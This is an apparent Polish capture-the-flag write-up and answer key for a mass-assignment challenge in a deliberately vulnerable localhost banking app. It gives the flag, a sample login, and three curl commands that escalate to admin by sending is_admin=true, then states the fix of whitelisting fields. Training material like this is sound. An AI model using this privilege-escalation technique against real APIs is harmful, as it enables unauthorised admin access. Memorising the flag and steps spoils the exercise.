# A14 - Mass Assignment

## Metadane
- **ID:** A14
- **Kategoria:** OWASP A01:2021
- **Trudnosc:** medium
- **Punkty:** 150
- **Flaga:** `PWR{m4ss_4ss1gnm3nt_pr1v_3sc}`

## Opis
Endpoint `/api/challenges/a14/profile/update` przyjmuje JSON
i przypisuje wszystkie pola bezposrednio do modelu uzytkownika.
Mozna nadpisac pole is_admin=true i uzyskac dostep do sekcji admina.

## Podatny endpoint
PATCH /api/challenges/a14/profile/update

## Exploit krok po kroku
### Krok 1: Zaloguj sie jako bob i pobierz token JWT:
`curl -X POST http://localhost:5000/api/auth/login -H "Content-Type: application/json" -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"password123\"}"`

### Krok 2: Wyslij PATCH z is_admin: true:
`curl -X PATCH http://localhost:5000/api/challenges/a14/profile/update -H "Authorization: Bearer TWOJ_TOKEN" -H "Content-Type: application/json" -d "{\"is_admin\": true}"`

### Krok 3: Pobierz flage z endpointu secret:
`curl http://localhost:5000/api/challenges/a14/secret -H "Authorization: Bearer TWOJ_TOKEN"`

## Jak to naprawic
Uzywac whitelisty dozwolonych pol zamiast przypisywac wszystko z JSON-a.

## Referencje
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html